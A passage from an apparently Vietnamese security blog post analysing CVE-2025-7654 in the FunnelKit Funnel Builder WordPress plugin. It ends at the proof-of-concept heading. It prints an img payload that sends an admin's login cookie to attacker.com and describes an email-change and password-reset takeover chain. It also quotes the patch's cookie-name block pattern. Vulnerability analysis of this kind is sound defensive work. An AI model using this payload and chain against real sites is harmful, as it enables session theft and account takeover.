Versions&lt;/strong&gt;: 3.11.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (8.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ultimate-post/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Funnel Builder by FunnelKit Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Funnel Builder by FunnelKit&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.11.0.2&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.12.0&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;WooCommerce Plugin&lt;/strong&gt; → &lt;a href=&#34;https://wordpress.org/plugins/woocommerce/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;WooCommerce&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi chú&lt;/p&gt;&lt;ul&gt;&#xA;&lt;li&gt;Mặc dù CVE được công bố cho rằng lỗ hổng đã được vá trong phiên bản &lt;code&gt;3.11.1&lt;/code&gt;, nhưng trên thực tế bản vá chỉ thực sự được áp dụng đầy đủ kể từ phiên bản &lt;code&gt;3.12.0&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&lt;/div&gt;&lt;ul&gt;&#xA;&lt;li&gt;Plugin &lt;strong&gt;yêu cầu WooCommerce để hoạt động&lt;/strong&gt;, do được &lt;strong&gt;tích hợp và phụ thuộc trực tiếp vào WooCommerce&lt;/strong&gt;; chỉ có thể được kích hoạt khi &lt;strong&gt;WooCommerce&lt;/strong&gt; đã được cài đặt và kích hoạt.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đăng ký các shortcode như sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public $shortcodes = array(&#xA;    &amp;#39;get_cookie&amp;#39;,&#xA;    &amp;#39;get_url_parameter&amp;#39;,&#xA;);&#xA;&#xA;public function __construct() {&#xA;    foreach ( $this-&amp;gt;shortcodes as $code ) {&#xA;        add_shortcode( &amp;#39;wf_&amp;#39; . $code, array( $this, $code ) );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Với cấu hình này, plugin tạo ra hai shortcode tương ứng với hai hàm callback để xử lý:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Shortcode &lt;code&gt;wf_get_cookie&lt;/code&gt; → callback &lt;code&gt;get_cookie&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Shortcode &lt;code&gt;wf_get_url_parameter&lt;/code&gt; → callback &lt;code&gt;get_url_parameter&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Trong đó, shortcode &lt;code&gt;wf_get_cookie&lt;/code&gt; trực tiếp liên quan đến lỗ hổng bảo mật.&lt;/p&gt;&#xA;&lt;p&gt;Khi shortcode này được nhúng vào bài viết hoặc trang, callback &lt;code&gt;get_cookie&lt;/code&gt; sẽ được gọi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function get_cookie( $attr ) {&#xA;    $attr = shortcode_atts( array(&#xA;        &amp;#39;key&amp;#39; =&amp;gt; &amp;#39;&amp;#39;,&#xA;    ), $attr );&#xA;&#xA;    if ( empty( $attr[&amp;#39;key&amp;#39;] ) ) {&#xA;        return &amp;#39;&amp;#39;;&#xA;    }&#xA;&#xA;    $data = isset( $_COOKIE[ $attr[&amp;#39;key&amp;#39;] ] ) ? bwf_clean( $_COOKIE[ $attr[&amp;#39;key&amp;#39;] ] ) : &amp;#39;&amp;#39;;&#xA;&#xA;    /*** read cookie when drop cookie on page **/&#xA;    if ( empty( $data ) ) {&#xA;        $key  = str_replace( &amp;#39;bwf_&amp;#39;, &amp;#39;&amp;#39;, $attr[&amp;#39;key&amp;#39;] );&#xA;        $data = isset( $_GET[ $key ] ) ? bwf_clean( $_GET[ $key ] ) : &amp;#39;&amp;#39;;&#xA;    }&#xA;&#xA;    return $data;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;get_cookie&lt;/code&gt; cho phép đọc trực tiếp giá trị cookie từ biến toàn cục &lt;code&gt;$_COOKIE&lt;/code&gt; và gán vào biến &lt;code&gt;$data&lt;/code&gt;. &lt;strong&gt;Nếu &lt;code&gt;$data&lt;/code&gt; không rỗng&lt;/strong&gt;, hàm sẽ bỏ qua hoàn toàn nhánh đọc từ &lt;code&gt;$_GET&lt;/code&gt; và &lt;strong&gt;trả về trực tiếp giá trị cookie đó&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Ví dụ, khi shortcode sau được nhúng vào một bài viết:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;[wf_get_cookie key=&amp;#39;wordpress_logged_in_86a9106ae65537651a8e456835b316ab&amp;#39;]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi một người dùng &lt;strong&gt;đã đăng nhập&lt;/strong&gt; truy cập bài viết này, shortcode sẽ được xử lý ở phía server và giá trị cookie &lt;code&gt;wordpress_logged_in_86a9106ae65537651a8e456835b316ab&lt;/code&gt; của &lt;strong&gt;chính người đang xem trang&lt;/strong&gt; sẽ được render thẳng vào nội dung bài viết.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-06-cve-2025-7654/cookie.png&#34; title=&#34;Cookie được hiển thị trong post&#34; data-thumbnail=&#34;/posts/2026-01-06-cve-2025-7654/cookie.png&#34; data-sub-html=&#34;&lt;h2&gt;Cookie&lt;/h2&gt;&lt;p&gt;Cookie được hiển thị trong post&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-06-cve-2025-7654/cookie.png&#39; alt=&#34;Cookie&#34; height=&#34;631&#34; width=&#34;1914&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Cookie được hiển thị trong post&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Thoạt nhìn, điều này có vẻ “vô hại”, vì mỗi người chỉ thấy cookie của &lt;strong&gt;chính mình&lt;/strong&gt;. Tuy nhiên, vấn đề nằm ở chỗ: shortcode không chỉ có thể hiển thị văn bản, mà còn có thể được nhúng vào &lt;strong&gt;các thuộc tính HTML&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Kẻ tấn công với quyền &lt;strong&gt;Contributor&lt;/strong&gt; có thể chèn shortcode vào thuộc tính &lt;code&gt;src&lt;/code&gt; của một thẻ &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; như sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;img src=&amp;#34;http://attacker.com/[wf_get_cookie key=&amp;#39;wordpress_logged_in_86a9106ae65537651a8e456835b316ab&amp;#39;]&amp;#34;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi &lt;strong&gt;quản trị viên (admin)&lt;/strong&gt; đăng nhập và mở bài viết này, shortcode sẽ được xử lý, cookie đăng nhập của admin sẽ bị chèn trực tiếp vào URL của ảnh. Trình duyệt sau đó sẽ gửi một request tới server của attacker, vô tình mang theo &lt;strong&gt;cookie xác thực của admin&lt;/strong&gt; trong đường dẫn.&lt;/p&gt;&#xA;&lt;p&gt;👉 Chính tại thời điểm này, cookie không còn “chỉ hiển thị cho người xem” nữa, mà đã bị &lt;strong&gt;rò rỉ ra bên ngoài&lt;/strong&gt;, mở đường cho việc chiếm quyền đăng nhập và leo thang đặc quyền.&lt;/p&gt;&#xA;&lt;p&gt;Tuy nhiên, ta cần phải nắm được cookie nào nguy hiểm để khai thác.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-06-cve-2025-7654/cookie_new.png&#34; title=&#34;Cookie được set khi login thành công&#34; data-thumbnail=&#34;/posts/2026-01-06-cve-2025-7654/cookie_new.png&#34; data-sub-html=&#34;&lt;h2&gt;Cookie&lt;/h2&gt;&lt;p&gt;Cookie được set khi login thành công&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-06-cve-2025-7654/cookie_new.png&#39; alt=&#34;Cookie&#34; height=&#34;797&#34; width=&#34;1914&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Cookie được set khi login thành công&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi người dùng đăng nhập thành công vào WordPress, hệ thống sẽ thiết lập hai cookie xác thực chính:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wordpress_86a9106ae65537651a8e456835b316ab&lt;/code&gt;: áp dụng cho các đường dẫn &lt;code&gt;/wp-content/plugins&lt;/code&gt; và &lt;code&gt;/wp-admin&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wordpress_logged_in_86a9106ae65537651a8e456835b316ab&lt;/code&gt;: áp dụng cho đường dẫn &lt;code&gt;/&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Trong đó, chuỗi &lt;code&gt;86a9106ae65537651a8e456835b316ab&lt;/code&gt; là &lt;strong&gt;giá trị hash được tạo từ URL của website&lt;/strong&gt;, cụ thể là &lt;code&gt;md5(&#39;http://localhost&#39;)&lt;/code&gt;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;Theo chuẩn &lt;a href=&#34;https://datatracker.ietf.org/doc/html/rfc6265#section-5.2.4&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;RFC 6265&lt;/a&gt;, mục &lt;strong&gt;5.2.4 – Path Attribute&lt;/strong&gt;, chuẩn này quy định cách trình duyệt xử lý thuộc tính &lt;code&gt;Path&lt;/code&gt; của cookie:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-06-cve-2025-7654/path.png&#34; title=&#34;Path theo chuẩn RFC 6265&#34; data-thumbnail=&#34;/posts/2026-01-06-cve-2025-7654/path.png&#34; data-sub-html=&#34;&lt;h2&gt;Path&lt;/h2&gt;&lt;p&gt;Path theo chuẩn RFC 6265&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-06-cve-2025-7654/path.png&#39; alt=&#34;Path&#34; height=&#34;354&#34; width=&#34;757&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Path theo chuẩn RFC 6265&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Điều này có nghĩa là:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Thuộc tính &lt;code&gt;Path&lt;/code&gt; xác định &lt;strong&gt;phạm vi đường dẫn (URL path)&lt;/strong&gt; mà cookie sẽ được gửi kèm trong các request HTTP.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Nhận diện thuộc tính &lt;code&gt;Path&lt;/code&gt;&lt;/strong&gt;: Nếu tên thuộc tính (không phân biệt chữ hoa/thường) là &lt;code&gt;Path&lt;/code&gt;, trình duyệt phải xử lý cookie theo các quy tắc bên dưới.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Trường hợp &lt;code&gt;Path&lt;/code&gt; rỗng hoặc không hợp lệ&lt;/strong&gt; (không bắt đầu bằng ký tự &lt;code&gt;/&lt;/code&gt;):&#xA;Trình duyệt sẽ gán &lt;code&gt;cookie-path&lt;/code&gt; bằng &lt;strong&gt;default-path&lt;/strong&gt;, tức là đường dẫn mặc định được suy ra từ URL đã tạo cookie.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-06-cve-2025-7654/default.png&#34; title=&#34;default-path theo chuẩn RFC 6265&#34; data-thumbnail=&#34;/posts/2026-01-06-cve-2025-7654/default.png&#34; data-sub-html=&#34;&lt;h2&gt;Default&lt;/h2&gt;&lt;p&gt;default-path theo chuẩn RFC 6265&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-06-cve-2025-7654/default.png&#39; alt=&#34;Default&#34; height=&#34;860&#34; width=&#34;771&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;default-path theo chuẩn RFC 6265&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Theo mục &lt;strong&gt;5.1.4 – Paths and Path-Match&lt;/strong&gt; của &lt;a href=&#34;https://datatracker.ietf.org/doc/html/rfc6265#section-5.1.4&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;RFC 6265&lt;/a&gt;, &lt;code&gt;default-path&lt;/code&gt; được tính như sau:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;uri-path&lt;/code&gt;: Lấy phần &lt;strong&gt;path&lt;/strong&gt; của &lt;code&gt;request-uri&lt;/code&gt; (không bao gồm query string).&lt;/li&gt;&#xA;&lt;li&gt;Nếu &lt;code&gt;uri-path&lt;/code&gt; rỗng hoặc không bắt đầu bằng &lt;code&gt;/&lt;/code&gt;, &lt;code&gt;default-path&lt;/code&gt; là &lt;code&gt;/&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Nếu &lt;code&gt;uri-path&lt;/code&gt; chỉ chứa một dấu &lt;code&gt;/&lt;/code&gt;, &lt;code&gt;default-path&lt;/code&gt; là &lt;code&gt;/&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Trong các trường hợp còn lại, &lt;code&gt;default-path&lt;/code&gt; là phần đường dẫn từ đầu &lt;code&gt;uri-path&lt;/code&gt; đến trước dấu &lt;code&gt;/&lt;/code&gt; ngoài cùng bên phải.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Trường hợp &lt;code&gt;Path&lt;/code&gt; hợp lệ&lt;/strong&gt; (bắt đầu bằng &lt;code&gt;/&lt;/code&gt;):&#xA;Trình duyệt sẽ sử dụng trực tiếp giá trị &lt;code&gt;Path&lt;/code&gt; này làm phạm vi áp dụng của cookie.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Sau khi xác định &lt;code&gt;cookie-path&lt;/code&gt;, trình duyệt sẽ lưu cookie kèm theo thuộc tính &lt;code&gt;Path&lt;/code&gt; tương ứng và chỉ gửi cookie này trong các request có URL path phù hợp.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;Kịch bản tấn công của lỗ hổng này có thể xảy ra trong hai trường hợp:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Quản trị viên truy cập bài viết &lt;strong&gt;chưa được publish&lt;/strong&gt; thông qua endpoint &lt;code&gt;/?p=354&amp;amp;preview=true&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Quản trị viên truy cập bài viết &lt;strong&gt;đã được publish&lt;/strong&gt; thông qua endpoint &lt;code&gt;/ten-post&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Trong cả hai trường hợp trên, &lt;strong&gt;chỉ cookie &lt;code&gt;wordpress_logged_in_86a9106ae65537651a8e456835b316ab&lt;/code&gt; được gửi kèm theo request&lt;/strong&gt;, do cookie này được thiết lập với &lt;code&gt;Path=/&lt;/code&gt; và áp dụng cho toàn bộ website.&lt;/p&gt;&#xA;&lt;p&gt;Vì vậy ta không có giá trị của cookie &lt;code&gt;wordpress_86a9106ae65537651a8e456835b316ab&lt;/code&gt; để truy cập trang quản trị (&lt;code&gt;/wp-admin&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;p&gt;Tuy nhiên ta vẫn có thể tấn công theo cách khác bằng cookie &lt;code&gt;wordpress_logged_in_86a9106ae65537651a8e456835b316ab&lt;/code&gt; để truy cập &lt;code&gt;/wp-admin&lt;/code&gt; :)))&lt;/p&gt;&#xA;&lt;p&gt;Khi setup &lt;strong&gt;FunnelKit&lt;/strong&gt; cùng &lt;strong&gt;WooCommerce&lt;/strong&gt;, endpoint &lt;code&gt;/my-account/edit-account/&lt;/code&gt; sẽ được sử dụng làm trang frontend cho phép &lt;strong&gt;người dùng đã đăng nhập&lt;/strong&gt; chỉnh sửa thông tin tài khoản, và tại đây cookie &lt;code&gt;wordpress_logged_in_*&lt;/code&gt; luôn được gửi kèm theo request do được thiết lập với &lt;code&gt;Path=/&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-06-cve-2025-7654/edit.png&#34; title=&#34;Edit profile&#34; data-thumbnail=&#34;/posts/2026-01-06-cve-2025-7654/edit.png&#34; data-sub-html=&#34;&lt;h2&gt;Path&lt;/h2&gt;&lt;p&gt;Edit profile&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-06-cve-2025-7654/edit.png&#39; alt=&#34;Path&#34; height=&#34;1076&#34; width=&#34;1918&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Edit profile&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Điểm đáng chú ý là khi thay đổi email tài khoản, hệ thống &lt;strong&gt;không yêu cầu nhập lại mật khẩu hay xác thực bổ sung&lt;/strong&gt;. Điều này có thể bị lợi dụng để &lt;strong&gt;thay đổi email của tài khoản admin sang email do attacker kiểm soát&lt;/strong&gt;. Sau đó, attacker chỉ cần sử dụng chức năng &lt;strong&gt;forgot password&lt;/strong&gt; để đặt mật khẩu mới và đăng nhập với quyền quản trị viên.&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;Bản vá trong &lt;strong&gt;v3.12.0&lt;/strong&gt; đã khắc phục lỗ hổng bằng cách &lt;strong&gt;giới hạn các cookie nhạy cảm không cho phép truy cập thông qua shortcode &lt;code&gt;wf_get_cookie&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Cụ thể, plugin bổ sung một danh sách các mẫu cookie bị chặn thông qua biến:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public $restricted_cookie_pattern = &amp;#34;/^(wordpress_.*|_fk_contact_uid|wp-settings-.*|PHPSESSID|wordpress_logged_in_.*|wp_woocommerce_session_.*)$/&amp;#34;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong hàm &lt;code&gt;get_cookie&lt;/code&gt;, trước khi đọc dữ liệu từ &lt;code&gt;$_COOKIE&lt;/code&gt;, plugin thực hiện kiểm tra:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (preg_match($this-&amp;gt;restricted_cookie_pattern, $attr[&amp;#39;key&amp;#39;])) {&#xA;    return &amp;#39;&amp;#39;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Điều này có nghĩa là nếu key của cookie khớp với các pattern nhạy cảm như:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wordpress_*&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wordpress_logged_in_*&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp-settings-*&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;PHPSESSID&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_woocommerce_session_*&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;thì hàm sẽ &lt;strong&gt;trả về rỗng&lt;/strong&gt; và &lt;strong&gt;không cho phép đọc giá trị cookie&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Nhờ đó, shortcode &lt;code&gt;wf_get_cookie&lt;/code&gt; không còn khả năng truy xuất cookie xác thực của WordPress hoặc WooCommerce, qua đó &lt;strong&gt;ngăn chặn hoàn toàn kịch bản rò rỉ cookie và privilege escalation&lt;/strong&gt; đã được khai thác ở các phiên bản trước.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Attacker (Contributor)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Create / Edit Post&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Insert shortcode wf_get_cookie into HTML attribute (img src)&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Post saved (draft or published)&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Admin visits post (preview or published URL)&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;WordPress processes shortcode server-side&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;wf_get_cookie reads wordpress_logged_in_* from $_COOKIE&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;Cookie value rendered into HTML output&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;Browser loads external resource (attacker.com)&amp;#34;]&#xA;I --&amp;gt; J[&amp;#34;Admin authentication cookie leaked via URL&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;Attacker captures wordpress_logged_in_* cookie&amp;#34;]&#xA;K --&amp;gt; L[&amp;#34;Attacker sets stolen cookie in browser&amp;#34;]&#xA;&#xA;L --&amp;gt; M[&amp;#34;Access /my-account/edit-account/ as Admin&amp;#34;]&#xA;M --&amp;gt; N[&amp;#34;Change admin email without re-authentication&amp;#34;]&#xA;&#xA;N --&amp;gt; O[&amp;#34;Trigger forgot password flow&amp;#34;]&#xA;O --&amp;gt; P[&amp;#34;Reset password via attacker-controlled email&amp;#34;]&#xA;&#xA;P --&amp;gt; Q[&amp;#34;Full admin account takeover&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a 